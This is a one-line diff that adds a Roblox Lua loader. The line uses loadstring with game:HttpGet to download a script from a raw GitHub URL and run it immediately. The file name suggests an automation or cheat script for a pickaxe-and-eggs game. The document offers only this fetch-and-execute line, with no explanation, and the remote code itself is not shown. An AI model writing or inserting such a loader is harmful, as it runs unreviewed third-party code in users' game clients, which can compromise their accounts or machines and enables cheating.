@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/1-pickaxe-swing-for-eggs-spam7-kibk4dienl47fp.lua"))()
